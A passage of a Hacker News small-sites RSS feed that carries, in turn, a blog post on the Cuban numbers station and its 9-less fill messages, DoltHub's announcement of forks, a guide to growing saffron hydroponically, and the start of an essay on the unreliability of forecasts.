To prevent "traffic analysis" that might reveal to an observer the number of active agents or the volume of messages sent to them, numbers stations typically operate on rigidly fixed schedules, sending messages at pre-determined times whether there is actually a message to be sent or not. When there is no traffic for a given timeslot, random dummy "fill" traffic is sent instead. The fill traffic should be indistinguishable to an outsider from real messages, thereby leaking nothing about how often or when the true messages are being sent. But more on this later.
</p><p>
None of this is by itself news. The existence of numbers stations has been publicly known (and tracked by hobbyists) since at least the 1960's, and OTPs are an elementary cryptographic technique known to every cryptographer. However, Strzok mentions two interesting details I'd not seen published previously and that may solve a mystery about one of the most well known numbers stations heard in North America.
</p><p>
First, <em>Compromised</em> reveals that the FBI found that during at least some of the time the illegals were under investigation, the Russian numbers intended for them were sent not by a transmitter in Russia (which might have difficulty being reliably received in the US), but relayed by the <em>Cuban</em> shortwave numbers station. This is perhaps a bit surprising, since the period in question (2000-2010) was well after the Soviet Union, the historic protector of Cuba's government, had ceased to exist.
</p><p>
The Cuban numbers station is somewhat legendary. It is a powerful station, operated by Cuba's intelligence directorate but co-located with Radio Habana's transmitters near Bauta, Cuba, and is easily received with even very modest equipment throughout the US. While its numbers transmissions have taken a variety of forms over the years, during the early 2000's it operated around the clock, transmitting in both voice and morse code. The station was (and remains) so powerful and widely heard that radio hobbyists quickly derived its hourly schedule. During this period, each scheduled hourly transmission consisted of a preamble followed by three messages, each made up entirely of a series of five digit groups (with by a brief period of silence separating the three messages). The three hourly messages would take a total of about 45 minutes, in either voice or morse code depending on the scheduled time and frequency. Every hour, the same thing, predictably right on schedule (with fill traffic presumably substituted for the slots during which there was no actual message).
</p><p>
If you want to hear what this sounded like, here's a recording I made on October 4, 2008 of one of the hourly voice transmissions, as received (static and all) in my Philadelphia apartment: <a target="_blank" href="https://www.mattblaze.org/private/17435khz-200810041700.mp3"><tt>www.mattblaze.org/private/17435khz-200810041700.mp3</tt></a>. The transmission follows the standard Cuban numbers format of the time, starting with an "Atenćion" preamble listing three five-digit identifiers for the three messages that follow, and ending with "Final, Final". In this recording, the first of the three messages (64202) starts at 3:00, the second (65852) at 16:00, and the third (86321) at 29:00, with the "Final" signoff at the end. The transmissions are, to my cryptographic ear at least, both profoundly dull and yet also eerily riveting. 
</p><p>
And this is where the mystery I've been wondering about comes in. In 2007, I noticed an odd anomaly: some messages completely lacked the digit 9 ("nueve"). Most messages had, as they always did and as you'd expect with OTP ciphertext, a uniform distribution of the digits 0-9. But other messages, at random times, suddenly had no 9s at all. I wasn't the only (or the first) person to notice this; apparently the 9s started disappearing from messages some time around 2005.
</p><p>
This is, to say the least, very odd. The way OTPs work should produce a uniform distribution of all ten digits in the ciphertext. The odds of an entire message lacking 9s (or any other digit) are infinitesimal. And yet such messages were plainly being transmitted, and fairly often at that. In fact, in the recording of the 2008 transmission linked to above, you will notice that while the second and third messages use all ten digits, the first is completely devoid of 9s.
</p><p>
I remember concluding that the most likely, if still rather improbable, explanation was that the 9-less messages were dummy fill traffic and that the random number generator used to create the messages had a bug or developed a defect that prevented 9s from being included. This would be, to say the least, a very serious error, since it would allow a listener to easily distinguish fill traffic from real traffic, completely negating the benefit of having fill traffic in the first place. It would open the door to exactly the kind of traffic analysis that the system was carefully engineered to thwart. The 9-less messages went on for almost ten years. (If I were reporting this as an Internet vulnerability, I would dub it the "Nein Nines" attack; please forgive the linguistic muddle). But I was resigned to the likelihood that I would never know for sure.
</p><p>
And this brings us to the second observation from Strzok's book.
</p><p>
<em>Compromised</em> doesn't say anything about missing nueves, but he does mention that the FBI exploited a serious tradecraft error on the part of the sender: the FBI was able …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.mattblaze.org/blog/neinnines/">https://www.mattblaze.org/blog/neinnines/</a></em></p>]]>
            </description>
            <link>https://www.mattblaze.org/blog/neinnines/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24521801</guid>
            <pubDate>Fri, 18 Sep 2020 20:55:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dolt releases forks to become a real open data collaboration platform]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24521536">thread link</a>) | @bheni
<br/>
September 18, 2020 | https://www.dolthub.com/blog/2020-09-18-introducing-forks/ | <a href="https://web.archive.org/web/*/https://www.dolthub.com/blog/2020-09-18-introducing-forks/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-cy="blog-post-text"><p>Today, <a href="https://dolthub.com/">DoltHub</a> released forks. It is the same system that Github uses for collaboration on over
100 million repositories contributed to by their 40+ million users.  For the first time there is a general platform
for data collaboration, and we hope it moves open data to the next level.</p>

<p>When we started this company in August 2018 something that excited us was expanding the types of businesses that you
could start, and succeed at.  In many of the spaces today, it is difficult to come in and compete with the large players
simply because they have huge amounts of data that isn't available publicly.</p>
<p>As an example, Google launched "Google Maps" in 2005 and has heavily invested in that space since then.  It had offered
an API freely until 2012 when it began charging.  If you want to come in and compete with Google Maps you will need data
that is at least as good or better than Google's.  You can pay Google for access to their data, but at that point
you are paying to make their data better, and the gap between the data that you have, and the data that they have widens.  You
could spend the money to acquire that data, but the cost of acquiring it is beyond the budget of any startup.
So the only way to compete is with the help of others. <a href="https://www.openstreetmap.org/#map=5/38.007/-95.844">Open Street Maps</a>
is an open data project with hundreds of contributors which is being used and contributed to by companies such as Apple, Faceebook,
Foursquare, Mapbox, MapQuest, Tesla, Wikipedia and Snapchat.</p>
<p>Projects such as <a href="https://wikipedia.com/">Wikipedia</a>, other <a href="https://wikimedia.org/">Wikimedia projects</a>, and
<a href="https://www.openstreetmap.org/#map=5/38.007/-95.844">Open Street Maps</a> have shown the power of community collaboration
on data. However, there hasn't ever been a platform that made collaborating on data feasible.</p>

<p>As obvious as the benefits of data collaboration are, there are very few successful collaborative data projects.  The ones
that have been successful created platforms for getting data mainlined using specialized processes for
editing, merging, and handling conflicts that are specific to their data. </p>
<p>Though not a data product, I'll also be looking at how Git/Github approached these problems in order to
become the largest collaborative coding platform in the world, and how this approach can be used to provide a general
purpose collaborative data platform, and how Dolt/Dolthub extend that to data.</p>
<h2>Merging and Conflicts</h2>
<p>Any time you have multiple editors working on something together, merging and conflicts are a problem.  Whether it's
people collaboratively editing a document online, working on source code managed by some version control system, or
editing data in a database there is always the potential for two or more users to be modifying the same data.</p>
<p>There are different strategies for dealing with this employed by different systems. A simple solution is to just allow
the last write to win.  Some systems might force manual merges, while others may have complex domain-specific rules for
completely automated merges.  Git and Dolt attempt to automatically merge multiple edits into one, and force manual
resolution when item cannot be merged without conflict. Dolt takes it a step further by allowing you to analyze
the differences, and conflicts via SQL, and then lets you write SQL to resolve them.  </p>
<h2>Data Quality and Trust</h2>
<p>Any time you are working on a project that is open to the world, you will have to deal with bad actors.  <a href="https://www.calvertjournal.com/articles/show/2967/wikipedia-russian-government-edits">Some have
bad intentions</a>, others
are <a href="https://www.boredpanda.com/funny-wikipedia-edits/">just having a laugh</a>, and others may be adding incorrect
data unintentionally.</p>
<p>Different moderation strategies can be employed each with their own strengths and weaknesses.  Automated moderation systems
can detect some types of data errors quickly, but they can take a lot of work to train and tune in order to have a
good hit rate for erroneous changes. User based moderation systems give control to community members, and they are easy
and low cost to deploy, but their success is highly variable depending on the abilities of the moderators.</p>
<p>GitHub and DoltHub organize their projects into repositories, and grant users different privileges.  Users
may be given write access to the project by one of its owners.  These users are trusted by the project to maintain
data quality and may make changes to the data directly. In GitHub, untrusted users may fork the data, and submit changes
back to the main dataset via a "Pull Request". <em>As of today, you can do that on DoltHub too</em> <a href="#introducing-dolthub-forks-and-cross-fork-pull-requests">(Details below)</a>. </p>
<h2>Community Disagreement and Ownership</h2>
<p>Even when you have a good moderation system, datasets evolve, and disagreements can arise.  As an example, In 2007 Open
Street Maps had an <a href="https://en.wikipedia.org/wiki/Wikipedia:Edit_warring">"edit war"</a>
over the language that should be used for locations in Turkish controlled Northern Cypress.  Wikipedia keeps a page
dedicated to the <a href="https://en.wikipedia.org/wiki/Wikipedia:Lamest_edit_wars">lamest edit wars</a> seen on their platform. Other
types of disputes could be simple disputes over schema, or formatting.</p>
<p>GitHub, and now DoltHub handle this with forks. In the event that you do not like the direction that a project is going
you can always fork the project, and take it in your own direction, and you can still continue to integrate changes
from the project that you forked from.  Additionally, you can still send PRs to get your changes pushed back onto the
project you forked from.  You can continue to collaborate with the entire community, even after you have taken your
version of the project in another direction. One major example of a successful fork is MariaDB. In 2009 MySQL was forked
after a couple of acquisitions left concerns about MySQL as an open source project. Today MariaDB is a thriving
project, with a robust community.</p>

<p>Today <a href="https://dolthub.com/">Dolthub</a> is launching forks, and it is a leap forward for collaborative data projects. This
is the first solution for open data collaboration which addresses all these problems in a generalized way.  </p>
<h2>What is a Fork</h2>
<p>A fork is a copy of the data which you become the owner of.  You control who can modify your data, and those users determine
what data gets merged.  You can continue to pull changes from the repository that you forked from, and you can submit
pull requests (PRs) back to it.  You can use it as a tool to get your changes onto a repository, or you can use it to
take that repository in a different direction.</p>
<h2>What is a Pull Request</h2>
<p>A pull request or PR is a request sent to the contributors of a repository to merge your changes into their repository. It
will encapsulate all the changes that were made between the first common ancestor of the source of your repository, and
the destination branch of the repository you are submitting to. Owners of the pull request's destination repository can
then review and integrate these changes into their repository.</p>

<p>At the end of july I wrote <a href="https://www.dolthub.com/blog/2020-07-29-scraping-linkedin/">an article about Open Resumes</a>,
where I talked about the motivations for scraping linked in, and the desire for an
<a href="https://www.dolthub.com/repositories/Liquidata/open-resumes/">Open Resumes</a> dataset. With the arrival of forks I invite
you to fork the dataset, and send us a pull request containing your scraped LinkedIn resume.  More than anything, our goal
here is to show off Dolt/DoltHub as a data collaboration platform. </p>

<p>With today's release we feel we are a step closer to being the platform that we envisioned in 2018.  We have built the most
important features of a collaborative data platform. We will continue to develop features to this end which will improve
the experience, but the next step is to get people to start collaborating on data on the platform. We are getting ready
to put our money where our mouth is.  Stay tuned for some announcements that could make you real money collaborating on
some of our datasets.</p></div></div>]]>
            </description>
            <link>https://www.dolthub.com/blog/2020-09-18-introducing-forks/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24521536</guid>
            <pubDate>Fri, 18 Sep 2020 20:26:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Growing Saffron Hydroponically: A Guide]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24521329">thread link</a>) | @jelliclesfarm
<br/>
September 18, 2020 | https://gardeningtips.in/growing-saffron-hydroponically-from-bulbs-a-full-guide | <a href="https://web.archive.org/web/*/https://gardeningtips.in/growing-saffron-hydroponically-from-bulbs-a-full-guide">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <!-- image --><div><figure><img width="696" height="522" src="https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720-696x522.jpg" srcset="https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720-696x522.jpg 696w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720-300x225.jpg 300w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720-768x576.jpg 768w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720-80x60.jpg 80w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720-265x198.jpg 265w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720-560x420.jpg 560w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720.jpg 800w" sizes="(max-width: 696px) 100vw, 696px" alt="Growing Saffron Hydroponically." title="Growing Saffron Hydroponically." data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20696%20522'%3E%3C/svg%3E" data-lazy-srcset="https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720-696x522.jpg 696w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720-300x225.jpg 300w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720-768x576.jpg 768w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720-80x60.jpg 80w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720-265x198.jpg 265w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720-560x420.jpg 560w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720.jpg 800w" data-lazy-src="https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720-696x522.jpg"><figcaption>Growing Saffron Hydroponically.</figcaption></figure></div>
            <!-- content --><h3><span id="A_step_by_step_guide_for_growing_hydroponic_saffron"><strong><u>A step by step guide for growing hydroponic saffron</u></strong></span>
</h3>
<p>Today, we discuss the topic of growing saffron hydroponically, hydroponic saffron plant care, hydroponic saffron bulb germination, harvesting procedure of hydroponic saffron, hydroponic nutrient solution, fertilizer for the saffron plants, and suitable hydroponic <a data-ail="1844" target="_self" href="https://gardeningtips.in/nft-hydroponics-system-building-requirements">NFT</a> (Nutrient film technique), DWC (Deepwater culture) system for growing saffron.</p>
<p>Hello, dear readers today we are back again with something more interesting and valuable for you. What if I say I have the formula to make you rich that too simply by gardening at your home only! The plant today we will be discussing is no less than a treasure, I hope all you are aware of the worldâ€™s most expensive spice!!</p>

<p>Yes, friends, we will be talking about <strong><u>how to grow saffron</u></strong> in a <a data-ail="1844" target="_self" href="https://gardeningtips.in/starting-hydroponics-gardening-at-home">hydroponics</a> system. Saffron: strands of gold a spice that costs more by weight than the gold. However, since we canâ€™t grow gold, saffron might be the next best thing.</p>
<h4><span id="Growing_saffron_bulbs_hydroponically"><strong><u>Growing saffron bulbs hydroponically</u></strong></span>
</h4>
<p>The saffron crocus (<em>Crocus sativus L.)</em> is propagated from a small rounded corm (very much similar to a bulb). Authentic Saffron spice comes from the stigma of the Saffron corm flower. The corm is basically the bulb from which the Saffron is grown it is a rounded tuber that gives rise to up to three flowers. The corms are purchased when they are in the dormant stage, and plant in late summer or early fall when they quickly burst into life with the production of small crocus flowers.</p>
<p>This exotic spice is the dried thread like red-gold colored stigma which is formed inside the beautiful blue/purple flower. Each flower produces on an average of three stigmas which give three strands of saffron. After flowering, the plant resumes its vegetative growth of thin, dark green strap-like leaves and then multiplies itself. It takes approximately a pound of fresh flowers to yield an ounce of stigmas. Once the stigmas are dried to produce the spice, it loses about 75 â€“ 80% of its mass and considerable weight leaving you with very little spice, which is one very solid reason the price is so very expensive. Furthermore, in addition to its culinary uses, Saffron has also demanded it is pharmaceutical, cosmetic, and industrial applications.</p>

<p>You may also like <a data-mil="1844" href="https://gardeningtips.in/growing-stevia-hydroponically-from-seed-a-full-guide"><span><strong>Growing Stevia Hydroponically from Seed</strong></span></a>.</p>
<p>Saffron is a tough crop to grow and maintain but far from impossible. In fact, probably <strong><u>saffron spice grown hydroponically</u></strong> is easy to grow and maintain than it would be conventional. The bulbs or corms are the propagating material and can be easily obtained from stores for <strong><u>growing saffron indoors for profit</u></strong> as well.</p>
<p>When buying corms for the first time, it is important to know that like many flowering bulbs, the corms come in different size grades from very small (0.6 grams) which would be a non-flowering type requiring an extra seasonâ€™s growth, to very large (24 grams).</p>

<p>The smaller corms are usually less expensive, but they may not produce flowers in the first season or gives a much lower yield of saffron and a lower number of daughter corms after flowering. The top planting grade for hydroponics is around 15 grams which are generally over an inch in diameter. The corms turn up dry in a dormant state ready for planting out.</p>
<p>In an indoor Hydroponic system, they can be planted throughout the year as you are determining and manipulating their growing environment affecting <strong><u>the growth of saffron</u></strong> even this is followed in the <strong><u>hydroponic flower farm</u></strong>.</p>
<p>The corms can be planted, flowered, and harvested in approximately 45-day cycles. At the completion of each cycle, you will have to start again with new corms or wait for the existing ones to go through their vegetative and dormancy phases before re-flowering and multiplying again.</p>
<h4><span id="The_dormancy_of_saffron_plants"><strong>The dormancy of saffron plants</strong></span>
</h4>
<figure id="attachment_1846" aria-describedby="caption-attachment-1846"><img src="https://gardeningtips.in/wp-content/uploads/2019/07/violet-4032577_960_720.jpg" alt="Saffron Plants." width="800" height="531" srcset="https://gardeningtips.in/wp-content/uploads/2019/07/violet-4032577_960_720.jpg 800w, https://gardeningtips.in/wp-content/uploads/2019/07/violet-4032577_960_720-300x199.jpg 300w, https://gardeningtips.in/wp-content/uploads/2019/07/violet-4032577_960_720-768x510.jpg 768w, https://gardeningtips.in/wp-content/uploads/2019/07/violet-4032577_960_720-696x462.jpg 696w, https://gardeningtips.in/wp-content/uploads/2019/07/violet-4032577_960_720-633x420.jpg 633w" sizes="(max-width: 800px) 100vw, 800px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20800%20531'%3E%3C/svg%3E" data-lazy-srcset="https://gardeningtips.in/wp-content/uploads/2019/07/violet-4032577_960_720.jpg 800w, https://gardeningtips.in/wp-content/uploads/2019/07/violet-4032577_960_720-300x199.jpg 300w, https://gardeningtips.in/wp-content/uploads/2019/07/violet-4032577_960_720-768x510.jpg 768w, https://gardeningtips.in/wp-content/uploads/2019/07/violet-4032577_960_720-696x462.jpg 696w, https://gardeningtips.in/wp-content/uploads/2019/07/violet-4032577_960_720-633x420.jpg 633w" data-lazy-src="https://gardeningtips.in/wp-content/uploads/2019/07/violet-4032577_960_720.jpg"><figcaption id="caption-attachment-1846">Saffron Plants.</figcaption></figure><p>The non-productive vegetative and dormancy phase takes approximately about nine months, so starting with new corms for each growth cycle is actually the most cost-effective way.</p>
<p>You may be interested in <a data-mil="1844" href="https://gardeningtips.in/growing-hydroponic-bitter-gourd-from-seed"><span><strong>Growing Hydroponic Bitter Gourd from Seed</strong></span></a>.</p>

<p>Another option is to keep several sets of corms and their daughter corms ready; while one set is in the dormant stage the others will be producing. Dormant Corms should be stored in a dry location and planted out at the appropriate time over the winter and will sprout again in the fall. After breaking the dormancy they do need to go through their vegetative stage to gain enough energy for the production of the following seasonâ€™s crop. Each healthy parent corm produces about five to ten daughter corms that can be used to give another crop in the following season.</p>
<h4><span id="Hydroponic_setup_and_nutrient_solution_for_saffron"><strong>Hydroponic setup and nutrient solution for saffron</strong></span>
</h4>
<p>For growing saffron in hydroponics system like NFT, DWC and pin trays are commonly used. Pin trays are principally temporary growing chambers where the plantsâ€™ roots will be growing and the bulbs are anchored. These chambers provide support while the roots are developing. Loose growing media such as Perlite, vermiculite â€“ <a data-ail="1844" target="_self" href="https://gardeningtips.in/hydroponics-perlite-growing-medium-advantages">perlite</a> blend, <a data-ail="1844" target="_self" href="https://gardeningtips.in/coconut-coir-benefits-for-gardening-making-uses">coco coir</a>. Oasis starter cubes are used for starting bulbs. The Media must be loose enough to allow bulb and root expansion but powerful enough to support the full-grown flowering plants.</p>
<p>Plants that grow with Bulbs or corms; grow best with lots of phosphorus and potassium for growth and flower production. Not too much nitrogen is required. Hydroponic nutrients are not strictly necessary for germination if you choose this way; the corms/seeds should be supplied with nutrients mixed at less than half strength with water.</p>


<p>You may also like<a data-mil="1844" href="https://gardeningtips.in/growing-hydroponic-broccoli-a-complete-guide"><strong><span> Growing Hydroponic Broccoli</span></strong></a>.</p>

<p>Some of the more adventurous growers like to dive into plant chemistry and formulate their own nutrient solutions, assuming you are prepared to deal with some plant losses while experimenting.</p>
<p>In the case of Saffron, the plant does not require much attention the only thing you are interested here is germination and flowering. Once the plant has flowered rest growth it is no longer of any use, the stigmas are harvested upon bloom. So the option is nutrient solution should be the one specially designed to promote flowering /blooms. Â&nbsp;So you can fetch bloom formulation from any store just make sure you do dilution as per the manufacturerâ€™s instructions. Nutrient values should be measured at regular intervals with pH and EC meters, nutrient attributes an EC of 1.4 and pH 5.5 encourage flowering.</p>
<h4><span id="The_temperature_requirement_for_growing_saffron_hydroponically"><strong>The temperature requirement for growing saffron hydroponically</strong></span>
</h4>
<p>One of the advantages of the indoor hydroponic technique is temperature can be manipulated by the grower. A range of 60 to 65 degree Fahrenheit in daytime range, with nigh-time temperature, should not be lower than 53 Fahrenheit is best for the flowering.</p>
<p>If it gets too warm the flower will experience flower drop and in too cold conditions plant will also get flower drop followed by dormancy. So indoor grow room, should be manipulated in such a way that it provides dry warmth of summer to induce growth, followed by damp and cooler conditions to induce flowering.</p>

<p>You should not miss <a data-mil="1844" href="https://gardeningtips.in/growing-bottle-gourd-hydroponically-lauki-from-seed"><strong><span>Growing Bottle Gourd Hydroponically</span></strong></a>.</p>
<h4><span id="The_light_requirement_for_saffron_growing_hydroponically"><strong>The light requirement for saffron growing hydroponically</strong></span>
</h4>
<p>Exposure of 14 to 16 hours of direct light per day is the optimal day length to induce flowering. Post-flowering the day length can be reduced to 12 â€“ 14 hours a day. So make sure you install your hydroponic setup in the place where optimum light hours are met.</p>
<h4><span id="Flowering_and_harvesting_saffron_in_hydroponics"><strong>Flowering and harvesting saffron in hydroponics</strong></span>
</h4>
<p>The flowering of the corms will usually take place quite quickly after planting; within a few weeks, the first emerging flower buds can be seen. The flowers will completely open within three to five days and will be ready for harvest. As each flower blooms, it should be plucked or snipped from the plant and taken away for further processing.</p>
<p>Inside the flower there will be two or three thin dark red coloured thread like a stigma which are the economic part of the plant and forms the saffron spice when dried; there will also be three, shorter, wider, golden-colored anthers which usually bear pollen on their surface these are not element of the spice and should be discarded. The simplest way of removing the saffron stigmas from the center of the flower is to pull back and remove all the petals and then clip the red strands at the base. These will then require to be dried before storage.</p>
<figure id="attachment_1845" aria-describedby="caption-attachment-1845"><img src="https://gardeningtips.in/wp-content/uploads/2019/07/saffron-215932_960_720.jpg" alt="Dry Saffron." width="800" height="535" srcset="https://gardeningtips.in/wp-content/uploads/2019/07/saffron-215932_960_720.jpg 800w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-215932_960_720-300x201.jpg 300w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-215932_960_720-768x514.jpg 768w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-215932_960_720-696x465.jpg 696w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-215932_960_720-628x420.jpg 628w" sizes="(max-width: 800px) 100vw, 800px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20800%20535'%3E%3C/svg%3E" data-lazy-srcset="https://gardeningtips.in/wp-content/uploads/2019/07/saffron-215932_960_720.jpg 800w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-215932_960_720-300x201.jpg 300w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-215932_960_720-768x514.jpg 768w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-215932_960_720-696x465.jpg 696w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-215932_960_720-628x420.jpg 628w" data-lazy-src="https://gardeningtips.in/wp-content/uploads/2019/07/saffron-215932_960_720.jpg"><figcaption id="caption-attachment-1845">Dry Saffron.</figcaption></figure><p>Saffron is very delicate and the strands should be placed carefully on white paper and allowed to air dry and fully desiccate. Any slight breeze can easily blow not only the strands but your efforts too. Being small and very light, the saffron dries within a week in most cases and can then be stored in airtight glass jars for better storage. A small pack of silicon desiccant can be used to make ensure that any additional moisture on the strands or air does not cause any storage problems. Inadequately dried saffron invites mold, fungi, so supplementary air-drying time is recommended if the humidity levels are high.</p>
<p>Thatâ€™s all folks about growing saffron hydroponically along with its cultivation practices without <a data-ail="1844" target="_self" href="https://gardeningtips.in/preparing-soil-for-vegetable-garden-a-full-guide">soil</a>.</p>
<p>You may also check the <a href="https://www.agrifarming.in/sweet-potato-cultivation-income-profit-project-report"><span><strong>Sweet Potato Cultivation Income, Profit, Project Report</strong></span></a>.</p>

<div>
<div data-currpage="1" id="epyt_gallery_76212"><iframe id="_ytid_61147" width="696" height="392" data-origwidth="696" data-origheight="392" src="https://www.youtube.com/embed/nqikG1ByIZQ?enablejsapi=1&amp;autoplay=0&amp;cc_load_policy=0&amp;iv_load_policy=1&amp;loop=0&amp;modestbranding=0&amp;rel=0&amp;fs=0&amp;playsinline=0&amp;autohide=2&amp;theme=dark&amp;color=red&amp;controls=1&amp;" title="YouTube player" data-epytgalleryid="epyt_gallery_76212" allow="autoplay; encrypted-media" allowfullscreen="" data-no-lazy="1" data-skipgform_ajax_framebjll=""></iframe><div><div><div tabindex="0" role="button" data-videoid="nqikG1ByIZQ"><div><div data-bg="https://i.ytimg.com/vi/nqikG1ByIZQ/hqdefault.jpg"><div><p><img alt="play" width="30" height="23" src="https://gardeningtips.in/wp-content/plugins/youtube-embed-plus/images/playhover.png" data-no-lazy="1" data-skipgform_ajax_framebjll=""></p></div></div></div><p>Terrace Gardening Guide</p></div><div tabindex="0" role="button" data-videoid="7rWkpXcrzrg"><div><div data-bg="https://i.ytimg.com/vi/7rWkpXcrzrg/hqdefault.jpg"><div><p><img alt="play" width="30" height="23" src="https://gardeningtips.in/wp-content/plugins/youtube-embed-plus/images/playhover.png" data-no-lazy="1" data-skipgform_ajax_framebjll=""></p></div></div></div><p>Growing Mushrooms Indoors</p></div><div tabindex="0" role="button" data-videoid="aIs5My0dRGI"><div><div data-bg="https://i.ytimg.com/vi/aIs5My0dRGI/hqdefault.jpg"><div><p><img alt="play" width="30" height="23" src="https://gardeningtips.in/wp-content/plugins/youtube-embed-plus/images/playhover.png" data-no-lazy="1" data-skipgform_ajax_framebjll=""></p></div></div></div><p>How To Make Compost</p></div><div tabindex="0" role="button" data-videoid="nL8pSWvQHHU"><div><div data-bg="https://i.ytimg.com/vi/nL8pSWvQHHU/hqdefault.jpg"><div><p><img alt="play" width="30" height="23" src="https://gardeningtips.in/wp-content/plugins/youtube-embed-plus/images/playhover.png" data-no-lazy="1" data-skipgform_ajax_framebjll=""></p></div></div></div><p>Growing Coriander from Seed</p></div><div tabindex="0" role="button" data-videoid="v5JeoXtqk2s"><div><div data-bg="https://i.ytimg.com/vi/v5JeoXtqk2s/hqdefault.jpg"><div><p><img alt="play" width="30" height="23" src="https://gardeningtips.in/wp-content/plugins/youtube-embed-plus/images/playhover.png" data-no-lazy="1" data-skipgform_ajax_framebjll=""></p></div></div></div><p>Organic Farming Basics</p></div><div tabindex="0" role="button" data-videoid="jB6rx9N5L1E"><div><div data-bg="https://i.ytimg.com/vi/jB6rx9N5L1E/hqdefault.jpg"><div><p><img alt="play" width="30" height="23" src="https://gardeningtips.in/wp-content/plugins/youtube-embed-plus/images/playhover.png" data-no-lazy="1" data-skipgform_ajax_framebjll=""></p></div></div></div><p>Hydroponic Farming</p></div></div></div></div></div>

<!-- AI CONTENT END 1 -->
        </div></div>]]>
            </description>
            <link>https://gardeningtips.in/growing-saffron-hydroponically-from-bulbs-a-full-guide</link>
            <guid isPermaLink="false">hacker-news-small-sites-24521329</guid>
            <pubDate>Fri, 18 Sep 2020 20:06:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Forecasting Fallacy]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 8 (<a href="https://news.ycombinator.com/item?id=24521279">thread link</a>) | @anarbadalov
<br/>
September 18, 2020 | https://www.alexmurrell.co.uk/articles/the-forecasting-fallacy | <a href="https://web.archive.org/web/*/https://www.alexmurrell.co.uk/articles/the-forecasting-fallacy">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div data-layout-label="Post Body" data-type="item" data-updated-on="1600438936254" id="item-5f5f85f0973bac65ca48c1f9"><div><div><div data-block-type="2" id="block-4be18d915b0dc68a6cc9"><div><h3>Introduction</h3><p>Marketers are prone to a prediction.</p><p>You’ll find them in the annual tirade of trend decks. In the PowerPoint projections of self-proclaimed prophets. In the feeds of forecasters and futurists.&nbsp;They crop up on every conference stage. They make their mark on every marketing magazine. And they work their way into every white paper.</p><p>To understand the extent of our forecasting fascination, I analysed the websites of three management consultancies looking for predictions with time frames ranging from 2025 to 2050. Whilst one prediction may be published multiple times, the size of the numbers still shocked me.&nbsp;Deloitte’s site makes 6904&nbsp;predictions.&nbsp;McKinsey &amp; Company make 4296. And Boston Consulting Group, 3679.</p><p>In total, these three&nbsp;companies’ websites include just shy of 15,000 predictions stretching out over the next 30 years.</p><p>But it doesn’t stop there.</p><p>My analysis finished in the year 2050 not because the predictions came to an end but because my enthusiasm did.</p><p>Search the sites and you’ll find forecasts stretching all the way to the year 2100. We’re still finding our feet in this century but some, it seems, already understand the next.</p><p>I believe the vast majority of these to be not forecasts but fantasies. Snake oil dressed up as science. Fiction masquerading as fact.</p><p>This article assesses how predictions have performed in five fields. It argues that poor projections have propagated throughout our society and proliferated throughout our industry. It argues that our fixation with forecasts is fundamentally flawed.</p><p>So instead of focussing on the future, let’s take a moment to look at the predictions of the past.&nbsp;Let’s see how our projections panned out.</p><h3>We can’t predict recessions</h3><p>The Economist’s “The World in 2020”, published in late 2019, brings together experts from business, politics and science to fill 150 pages with projections for the year ahead.</p><p>Editor Daniel Franklin&nbsp;<a href="https://theworldin.economist.com/edition/2020/article/17308/world-2020"><span>summarised</span></a>&nbsp;the issue’s predictions on 2020’s economic outlook:&nbsp;</p><blockquote><p>“Banks, especially in Europe, will battle with negative interest rates. America will flirt with recession—but don’t be surprised if disaster fails to strike, and markets revive.”</p></blockquote><p>Just over two months later COVID-19 struck, the world went into lockdown and we fell into one of the largest&nbsp;<a href="https://news.sky.com/story/coronavirus-largest-uk-recession-on-record-official-figures-12047521"><span>recessions</span></a>&nbsp;on record.</p><p>Perhaps this critique is unfair. The Economist wasn’t to know that we were on the precipice of a pandemic.&nbsp;So let’s review our success rate during more stable times.</p><p>Over to the&nbsp;<a href="https://www.ft.com/content/70a2a978-adac-11e7-8076-0a4bdda92ca2"><span>Financial Times</span></a>:</p><blockquote><p>&nbsp;“In 